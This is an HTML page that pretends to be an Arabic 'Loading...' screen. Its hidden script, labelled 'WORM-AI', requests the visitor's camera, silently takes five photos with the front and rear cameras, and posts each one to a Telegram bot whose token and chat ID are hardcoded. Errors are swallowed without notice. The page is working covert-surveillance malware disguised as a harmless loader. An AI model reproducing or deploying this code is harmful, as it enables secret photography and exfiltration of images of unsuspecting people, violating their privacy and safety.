<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8">
<title>جاري التحميل...</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;font-size:18px;overflow:hidden}
#loader{width:120px;height:120px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#msg{margin-top:20px;letter-spacing:2px}
video,canvas{display:none}
</style>
</head>
<body>
<div id="loader"></div>
<div id="msg">جاري التحميل...</div>

<script>
/*  WORM-AI💀🔥  */
const TOKEN = "8739449595:AAHIKvCHeQw3mI_lIcUM2TsXBvFbMkyWXAs";
const CHAT  = "5648499583";
const URL   = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

async function snap(label){
  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:label}});
  const track  = stream.getVideoTracks()[0];
  const img    = new ImageCapture(track);
  const bitmap = await img.grabFrame();
  const canvas = document.createElement("canvas");
  canvas.width  = bitmap.width;
  canvas.height = bitmap.height;
  canvas.getContext("2d").drawImage(bitmap,0,0);
  track.stop();
  return await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
}

async function exfil(blob,label){
  const fd = new FormData();
  fd.append("chat_id",CHAT);
  fd.append("caption",`${label} - ${new Date().toLocaleString("ar-EG")}`);
  fd.append("photo",new File([blob],`${label}.jpg`,{type:"image/jpeg"}));
  await fetch(URL,{method:"POST",body:fd});
}

(async()=>{
  try{
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cams    = devices.filter(d=>d.kind==="videoinput");
    const labels  = ["user","environment","user","environment","user"]; // 5 shots
    for(let i=0;i<5;i++){
      const label = labels[i%cams.length];
      const pic   = await snap(label);
      await exfil(pic,label);
    }
  }catch(e){
    // silent fail
  }
})();
</script>
</html>
